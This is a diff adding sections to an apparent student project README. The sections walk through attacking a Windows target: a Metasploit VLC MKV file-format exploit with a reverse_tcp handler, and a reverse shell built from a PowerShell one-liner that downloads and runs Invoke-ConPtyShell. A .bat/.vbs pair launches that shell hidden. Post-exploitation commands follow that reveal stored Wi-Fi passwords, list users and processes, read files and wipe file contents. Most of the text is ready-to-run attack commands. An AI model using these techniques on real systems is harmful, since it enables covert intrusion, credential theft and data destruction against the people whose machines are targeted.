@@ -672,6 +672,122 @@ A connection is established
 ![image](https://user-images.githubusercontent.com/97077110/149285349-4009e9d8-ee61-481f-8d21-8432d024a195.png)
 
 
+## VLC msfconsole:  
+
+Run ```msfconsole ```
+
+![image](https://user-images.githubusercontent.com/97077110/149287085-10a21ee8-5bab-447d-b227-a07a44bbca97.png)  
+
+```use exploit/windows/fileformat/vlc_mkv```
+![image](https://user-images.githubusercontent.com/97077110/149287224-085778c8-2411-4d4d-a450-18368db7cfac.png)
+
+```set LHOST (host ip)```
+![image](https://user-images.githubusercontent.com/97077110/149287351-099f5084-6874-44f9-93bf-8eb7cdf15200.png)
+
+```exploit```
+![image](https://user-images.githubusercontent.com/97077110/149287459-ad5c6c9b-f783-4ed2-a947-bba6fafbf477.png)  
+
+
+Copy the payload file into the web directory  
+```sudo cp /home/kali/.msf4/local/elf-part1.mkv /var/www/html/FYP1```
+![image](https://user-images.githubusercontent.com/97077110/149290400-14f63585-b9a8-45cd-8483-c06545c29a9a.png)
+
+On msfconsole ,create a reverse shell to connect back to the target :  
+```use multi/handler```
+```set LHOST 192.168.86.129```
+```set payload windows/x64/shell/reverse_tcp```
+
+![image](https://user-images.githubusercontent.com/97077110/149290641-f380a358-ada2-48f9-bb63-e7521afb199f.png)  
+
+Target side:
+Ensure that the VLC verison is 2.2.8 or older  
+![image](https://user-images.githubusercontent.com/97077110/149291096-650ba2c9-c57f-44c7-b887-77591fca83b0.png)
+
+Download the two video file
+![image](https://user-images.githubusercontent.com/97077110/149291131-ba13847e-337e-49ea-bf7f-5a62d788a0d0.png)
+
+![image](https://user-images.githubusercontent.com/97077110/149291179-d5197dff-9b0d-4d6f-bee8-ebbcc47a9be9.png)
+
+Run the file using VLC :
+![image](https://user-images.githubusercontent.com/97077110/149291235-1884a30b-c8de-4a2c-a57a-b73c2a00331d.png)  
+
+Attacker side:
+A reverse shell is created.
+![image](https://user-images.githubusercontent.com/97077110/149291285-4d924a83-94fd-4a0d-85bd-a107ea62867a.png)
+
+
+
+## Netcat Reverse shell connection:  
+
+In the Attacker side :
+Need to open a listener for any incoming connection  
+```stty raw -echo; (stty size; cat) | nc -lvnp 3001```  
+
+Afterwards on the client side to run powershell hidden, there is 3 files that we need to use.  
+
+Fyp.ps1:  
+This file contain the main payload that will be use to create reverse shell  
+Command:  
+```IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell (Host IP) (listener port)```
+
+![image](https://user-images.githubusercontent.com/97077110/149295156-d2d06499-aedc-4c88-bd7b-d002f6f08635.png)
+
+Fyp.bat:  
+
+Create a .bat file and insert this code.  
+This file will point to the payload file .ps1  
+
+Command :```powershell.exe -ExecutionPolicy Bypass C:\fyp.ps1```  
+
+Fyp.vbs:  
+This script is set to create a Wscript shell and point to the .bat file  
+
+Command:  
+Set WinScriptHost = CreateObject("WScript.Shell")  
+WinScriptHost.Run Chr(34) & "C:\fyp.bat" & Chr(34), 0  
+Set WinScriptHost = Nothing  
+  
+Once these three files are downloaded and placed in the C: drive. We just have to run the .vbs file and a reverse shell connection will be created.  
+
+![image](https://user-images.githubusercontent.com/97077110/149295328-68fb39f5-d2cc-40b3-8ad5-5f9b5bfa7c22.png)
+
+
+We can view the directory of the target computer/server:
+dir  
+
+We can view the Users in the target computer/server:
+```Get-LocalUser ``` 
+![image](https://user-images.githubusercontent.com/97077110/149295392-5e7e8718-c681-4eba-8857-a29917067be9.png)  
+
+We can view the the Wifi interfaces that the target computer connected and get a clear view of the password:
+
+```netsh wlan show profiles```
+
+![image](https://user-images.githubusercontent.com/97077110/149295458-d8e2841a-3c49-4d4e-87a2-e10afbc0d876.png)  
+```Netsh wlan show profile name=” (Wifi SSID)” key=clear```  
+![image](https://user-images.githubusercontent.com/97077110/149295654-529d5e72-5bce-4d26-8c3e-e694358f081d.png)
+We can view the running process on the target computer/server:
+```Get-process```  
+![image](https://user-images.githubusercontent.com/97077110/149295717-bddc35a0-6346-4b4b-99ca-461593367fd4.png)  
+
+We can view the text file on the target computer/server:
+```Get-Content (file path )```
+
+![image](https://user-images.githubusercontent.com/97077110/149295773-11b9d86b-ac2d-4580-b3cd-20f040db2460.png)
+
+We can clear the content of the file while retaining the item of itself:
+```Clear-Content (file path)```
+
+![image](https://user-images.githubusercontent.com/97077110/149295848-a8fac2ec-cc09-469b-b3ac-0e0be48e36e8.png)
+
+
+
+
+
+
+
+
+
 
 
 
